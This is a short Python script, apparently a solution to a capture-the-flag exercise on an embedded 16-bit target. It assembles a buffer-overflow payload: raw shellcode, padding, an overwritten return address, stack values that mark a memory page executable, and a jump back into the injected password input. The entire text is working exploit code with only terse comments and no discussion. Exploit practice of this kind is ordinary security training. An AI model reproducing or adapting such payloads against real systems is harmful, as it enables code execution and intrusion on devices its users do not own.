import struct
def hex_to_str(s):
	return " ".join("{:02x}".format(ord(c)) for c in s)
	
def endian(addr):
	return hex_to_str(struct.pack("H",addr))

padding_length = 16
shell_code = "324000ffb0121000"

password = shell_code + " "
password += hex_to_str("A"* (padding_length-(len(shell_code)/2)) ) + " "#nops
password += endian(0x44be) + " "#r11
password += "00 "*6 #setup stack for adding stack to execution table
password += endian(0x3f)+" " #stack page
password += endian(0x0) + " " #type to set as 0x0 for x and 0x1 for rw
password += endian(0x3fee)#start of our password input  

print(password)